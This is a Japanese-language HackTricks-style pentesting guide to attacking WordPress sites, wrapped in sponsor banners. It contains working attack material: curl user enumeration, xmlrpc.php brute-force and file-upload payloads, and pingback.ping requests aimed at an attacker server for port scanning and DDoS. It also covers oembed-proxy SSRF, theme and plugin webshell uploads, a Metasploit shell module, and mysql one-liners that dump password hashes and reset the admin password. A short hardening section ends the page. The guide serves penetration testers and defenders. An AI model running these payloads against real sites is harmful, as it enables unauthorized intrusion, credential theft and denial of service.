# Wordpress

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい場合**は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れる
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する：[**@carlospolopm**](https://twitter.com/hacktricks_live)。
- **HackTricks**および**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 基本情報

**アップロードされた**ファイルはこちらに保存されます：`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**テーマファイルは/wp-content/themes/にあります**、したがって、テーマの一部のphpを変更してRCEを取得する場合はおそらくそのパスを使用します。例：**twentytwelveテーマ**を使用して、次の場所で**404.php**ファイルにアクセスできます：[**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**別の便利なURLは次のとおりです：** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

**wp-config.php**にはデータベースのルートパスワードが記載されています。

チェックするデフォルトのログインパス：_**/wp-login.php、/wp-login/、/wp-admin/、/wp-admin.php、/login/**_

### **主要なWordPressファイル**

- `index.php`
- `license.txt`には、インストールされているWordPressのバージョンなど、有用な情報が含まれています。
- `wp-activate.php`は、新しいWordPressサイトを設定する際のメールアクティベーションプロセスに使用されます。
- ログインフォルダ（非表示にするために名前が変更されている場合があります）：
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php`は、WordPressの機能を表すファイルであり、HTTPを転送メカニズムとして、XMLをエンコードメカニズムとして使用します。この種の通信はWordPressの[REST API](https://developer.wordpress.org/rest-api/reference)によって置き換えられています。
- `wp-content`フォルダは、プラグインやテーマが保存されるメインディレクトリです。
- `wp-content/uploads/`は、プラットフォームにアップロードされたファイルが保存されるディレクトリです。
- `wp-includes/`これは、証明書、フォント、JavaScriptファイル、ウィジェットなどのコアファイルが保存されているディレクトリです。
- `wp-sitemap.xml`WordPressバージョン5.5以降では、WordPressはすべての公開投稿および公開クエリ可能な投稿タイプおよびタクソノミーを含むサイトマップXMLファイルを生成します。

**ポストエクスプロイテーション**

- `wp-config.php`ファイルには、WordPressがデータベースに接続するために必要な情報が含まれています。データベース名、データベースホスト、ユーザー名とパスワード、認証キーとソルト、データベーステーブルの接頭辞など。この構成ファイルは、トラブルシューティングに役立つDEBUGモードをアクティブにするためにも使用できます。

### ユーザー権限

- **管理者**
- **編集者**：自分自身および他の投稿を公開および管理します
- **著者**：自分自身の投稿を公開および管理します
- **寄稿者**：自分の投稿を書き、管理しますが、公開することはできません
- **購読者**：投稿を閲覧し、プロフィールを編集します

## **パッシブ列挙**

### **WordPressのバージョンを取得**

ファイル`/license.txt`または`/readme.html`を見つけることができるかどうかを確認します

ページの**ソースコード**内（例：[https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)からの例）：
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
* `meta name`

![](<../../.gitbook/assets/image (343).png>)

* CSS link files

![](<../../.gitbook/assets/image (344).png>)

* JavaScript files

![](<../../.gitbook/assets/image (346).png>)

### プラグインの取得

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### テーマの取得

{% code overflow="wrap" %}
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 一般的なバージョンの抽出

{% code overflow="wrap" %}
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## アクティブな列挙

### プラグインとテーマ

おそらくすべてのプラグインとテーマを見つけることはできません。すべてを発見するには、**プラグインとテーマのリストをアクティブにブルートフォースする**必要があります（幸いなことに、このリストを含む自動化ツールがあります）。

### ユーザー

**IDブルート**

WordPressサイトから有効なユーザーを取得するには、ユーザーIDをブルートフォースすることができます：
```
curl -s -I -X GET http://blog.example.com/?author=1
```
**200**または**30X**の応答の場合、そのIDは**有効**であることを意味します。応答が**400**の場合、IDは**無効**です。

**wp-json**

また、次のようにユーザーに関する情報を取得することもできます:
```
curl http://blog.example.com/wp-json/wp/v2/users
```
もう1つの`/wp-json/`エンドポイントは、ユーザーに関する情報を明らかにする可能性があります。
```
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **Only information about the users that has this feature enable will be provided**.

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

#### ログインユーザー名の列挙

**`/wp-login.php`** にログインすると、指定されたユーザー名が存在するかどうかに応じて、**メッセージ** が **異なります**。

### XML-RPC

`xml-rpc.php` がアクティブな場合、資格情報の総当たり攻撃を実行したり、他のリソースにDoS攻撃を行ったりできます（たとえば、[これ](https://github.com/relarizky/wpxploit)を使用してこのプロセスを自動化できます）。

アクティブかどうかを確認するには、_**/xmlrpc.php**_ にアクセスして、このリクエストを送信してください:

**Check**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**資格情報のブルートフォース**

**`wp.getUserBlogs`**、**`wp.getCategories`**、または**`metaWeblog.getUsersBlogs`**は、資格情報のブルートフォースに使用できるいくつかのメソッドです。これらのいずれかを見つけることができれば、次のようなものを送信できます:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200コードのレスポンス内にあるメッセージ「ユーザー名またはパスワードが正しくありません」は、資格情報が有効でない場合に表示されるべきです。

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

正しい資格情報を使用すると、ファイルをアップロードすることができます。レスポンスにはパスが表示されます ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
また、**`system.multicall`** を使用して複数の資格情報を同じリクエストで試すことで、資格情報を短時間で総当たりする**より速い方法**があります：

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**2段階認証のバイパス**

この方法はプログラム向けであり、人間向けではなく、古いため2段階認証をサポートしていません。したがって、有効な資格情報を持っているが、メインエントランスが2段階認証で保護されている場合、**xmlrpc.phpを悪用して2段階認証をバイパスしてログイン**することができるかもしれません。すべての操作をコンソール経由で行うことはできないことに注意してくださいが、Ippsecが[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)で説明しているように、RCEに到達することができるかもしれません。

**DDoSまたはポートスキャン**

リスト内に**_pingback.ping_** メソッドを見つけることができれば、WordPressに任意のホスト/ポートにリクエストを送信させることができます。\
これを使用して、**数千**のWordPress **サイト**に1つの**場所**に**アクセス**させることができます（その場所で**DDoS**が発生する）または、WordPressに内部のネットワークを**スキャン**させることができます（任意のポートを指定できます）。
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode** の値が **0** (17) よりも **大きい** 場合、ポートが開いていることを意味します。

**`system.multicall`** の使用方法を見て、このメソッドを悪用して DDoS を引き起こす方法を学んでください。
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

このファイルは通常、Wordpressサイトのルートの下に存在します: **`/wp-cron.php`**\
このファイルに**アクセス**すると、**重い**MySQL **クエリ**が実行されるため、**攻撃者**が**DoS**を引き起こすために使用できます。\
また、デフォルトでは、`wp-cron.php`はすべてのページロード（クライアントがWordpressページをリクエストするたび）で呼び出されるため、高トラフィックのサイトでは問題を引き起こす可能性があります（DoS）。

Wp-Cronを無効にして、ホスト内で必要なアクションを定期的に実行する実際のcronjobを作成することが推奨されています（問題を引き起こさずに）。

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ にアクセスし、Wordpressサイトがリクエストを行う可能性があります。

これが機能しない場合の応答:

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

このツールは、**methodName: pingback.ping**とパス**/wp-json/oembed/1.0/proxy**が存在するかどうかをチェックし、存在する場合はそれらを悪用しようとします。

### Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 1ビットを上書きしてアクセスを取得

これは実際の攻撃よりも好奇心です。CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)では、任意のWordPressファイルから1ビットを反転させることができました。したがって、ファイル`/var/www/html/wp-includes/user.php`の位置`5389`を反転させて、NOT（`!`）操作をNOPにすることができます。
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **パネルRCE**

**使用されているテーマのphpを変更（管理者の資格情報が必要）**

外観 → テーマエディタ → 404テンプレート（右側）

phpシェルの内容を変更します：

![](<../../.gitbook/assets/image (21) (1) (1).png>)

インターネットで検索して、その更新されたページにアクセスできる方法を調べます。この場合、ここにアクセスする必要があります：[http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

次のように使用できます：
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## プラグインRCE

### PHPプラグイン

プラグインとして.phpファイルをアップロードすることが可能かもしれません。\
たとえば、次のようにphpバックドアを作成します：

![](<../../.gitbook/assets/image (407).png>)

次に新しいプラグインを追加します：

![](<../../.gitbook/assets/image (409).png>)

プラグインをアップロードして「今すぐインストール」をクリックします：

![](<../../.gitbook/assets/image (411).png>)

「続行」をクリックします：

![](<../../.gitbook/assets/image (412).png>)

おそらく、これは見た目では何も起こりませんが、メディアに移動するとアップロードしたシェルが表示されます：

![](<../../.gitbook/assets/image (413).png>)

アクセスして、逆シェルを実行するためのURLが表示されます：

![](<../../.gitbook/assets/image (414).png>)

### 悪意のあるプラグインのアップロードと有効化

この方法は、脆弱性があると知られている悪意のあるプラグインをインストールし、Webシェルを取得することができるようにするものです。このプロセスはWordPressダッシュボードを介して次のように行われます：

1. **プラグインの取得**：プラグインは、[**ここ**](https://www.exploit-db.com/exploits/36374)のようなExploit DBなどのソースから取得されます。

2. **プラグインのインストール**：
   - WordPressダッシュボードに移動し、`ダッシュボード > プラグイン > プラグインをアップロード`に移動します。
   - ダウンロードしたプラグインのzipファイルをアップロードします。

3. **プラグインの有効化**：プラグインが正常にインストールされると、ダッシュボードを介して有効化する必要があります。

4. **悪用**：
   - プラグイン「reflex-gallery」がインストールおよび有効化されている場合、脆弱性があるため悪用できます。
   - Metasploitフレームワークはこの脆弱性のためのエクスプロイトを提供します。適切なモジュールを読み込み、特定のコマンドを実行することで、meterpreterセッションを確立し、サイトへの不正アクセスを許可します。
   - これはWordPressサイトを悪用するための多くの方法のうちの1つであることに注意してください。

コンテンツには、WordPressダッシュボードでプラグインをインストールおよび有効化する手順を示すビジュアルエイドが含まれています。ただし、このような脆弱性を悪用することは、適切な許可なしには違法で倫理的に問題があります。この情報は責任を持って使用し、合法的なコンテキスト（たとえば、明示的な許可を得たペネトレーションテストなど）でのみ使用すべきです。

**詳細な手順については、[https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**を参照してください。


## ポストエクスプロイテーション

ユーザー名とパスワードを抽出します：
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
### 管理者パスワードの変更:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## WordPressの保護

### 定期的な更新

WordPress、プラグイン、およびテーマが最新であることを確認してください。また、自動更新がwp-config.phpで有効になっていることも確認してください：
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
また、**信頼できるWordPressプラグインとテーマのみをインストール**してください。

### セキュリティプラグイン

* [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
* [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
* [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **その他の推奨事項**

* デフォルトの**admin**ユーザーを削除
* **強力なパスワード**と**2要素認証**を使用
* 定期的にユーザーの**権限を確認**
* ブルートフォース攻撃を防ぐためにログイン試行回数を**制限**
* **`wp-admin.php`**ファイルの名前を変更し、内部からのアクセスまたは特定のIPアドレスからのみアクセスを許可します。

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスしてください：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)のコレクションを見つけます
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**します。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
